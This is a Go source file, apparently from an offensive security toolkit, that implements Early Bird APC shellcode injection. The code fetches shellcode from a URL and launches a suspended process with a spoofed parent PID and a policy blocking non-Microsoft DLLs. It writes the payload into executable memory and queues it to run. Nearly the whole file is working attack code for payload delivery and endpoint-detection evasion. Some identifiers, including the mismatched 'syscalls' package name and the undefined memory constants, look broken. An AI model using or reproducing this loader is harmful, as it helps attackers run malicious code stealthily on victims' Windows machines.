//Reference: https://github.com/D00MFist/Go4aRun
package techniques

import (
	"github.com/sh4hin/GoPurple/helpers"
	"github.com/sh4hin/GoPurple/sliverpkg"
	"errors"
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

func RunQueueUserAPC(url string, pid int,prog string, block string) {
	shellcode := helpers.FetchUrl(url)

	procThreadAttributeSize := uintptr(0)
	_ = syscalls.InitializeProcThreadAttributeList(nil, 2, 0, &procThreadAttributeSize)
	procHeap, _ := syscalls.GetProcessHeap()
	attributeList, _ := syscalls.HeapAlloc(procHeap, 0, procThreadAttributeSize)
	defer syscalls.HeapFree(procHeap, 0, attributeList)
	var startupInfo syscalls.StartupInfoEx
	startupInfo.AttributeList = (*syscalls.PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
	_ = syscalls.InitializeProcThreadAttributeList(startupInfo.AttributeList, 2, 0, &procThreadAttributeSize)
	mitigate := 0x20007 //"PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY"
	//Options for Block Dlls
	nonms := uintptr(0x100000000000)     //"PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON"
	onlystore := uintptr(0x300000000000) //"BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE"
	if block == "nonms" {
		_ = syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &nonms, unsafe.Sizeof(nonms), 0, nil)
	} else if block == "onlystore" {
		_ = syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &onlystore, unsafe.Sizeof(onlystore), 0, nil)
	} else {
		fmt.Println("wrong block mode")
	}


		ppid := uint32(pid)
		parentHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, ppid)
		uintParentHandle := uintptr(parentHandle)
	_ = syscalls.UpdateProcThreadAttribute(startupInfo.AttributeList, 0, syscalls.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &uintParentHandle, unsafe.Sizeof(parentHandle), 0, nil)

		var procInfo windows.ProcessInformation
		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
		creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
		utfProgramPath, _ := windows.UTF16PtrFromString(prog)
	_ = syscalls.CreateProcess(nil, utfProgramPath, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)

		injectinto := int(procInfo.ProcessId)

		var victimHandle = procInfo.Thread
		var _, RAddr, _ = WriteShellcode(injectinto, shellcode)
	_ = EBAPCQueue(RAddr, victimHandle)
	}



// Process Functions
// Needed to enum process to get pid of process we want to spoof


const (
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
)

var (
	kernel32            = syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
	WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
	OpenProcess         = kernel32.MustFindProc("OpenProcess")
	QueueUserAPC        = kernel32.MustFindProc("QueueUserAPC")
)

func WriteShellcode(PID int, Shellcode []byte) (uintptr, uintptr, int) {
	LAddr, _, _ := VirtualAlloc.Call(0, uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	LAddrptr := (*[6300000]byte)(unsafe.Pointer(LAddr))
	for i := 0; i < len(Shellcode); i++ {
		LAddrptr[i] = Shellcode[i]
	}
	var F = 0
	Proc, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, uintptr(F), uintptr(PID))
	RAddr, _, _ := VirtualAllocEx.Call(Proc, uintptr(F), uintptr(len(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	_, _, _ = WriteProcessMemory.Call(Proc, RAddr, LAddr, uintptr(len(Shellcode)), uintptr(F))
	return Proc, RAddr, F
}

//EBAPCQueue spawns shellcode in a remote process using Early Bird APC Queue Code Injection
func EBAPCQueue(RAddr uintptr, victimHandle windows.Handle) error {
	_, _, errQueueUserAPC := QueueUserAPC.Call(RAddr, uintptr(victimHandle), 0)
	if errQueueUserAPC.Error() != "The operation completed successfully." {
		err := errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
		return err
	}
	_, _ = windows.ResumeThread(victimHandle)
	return nil
}
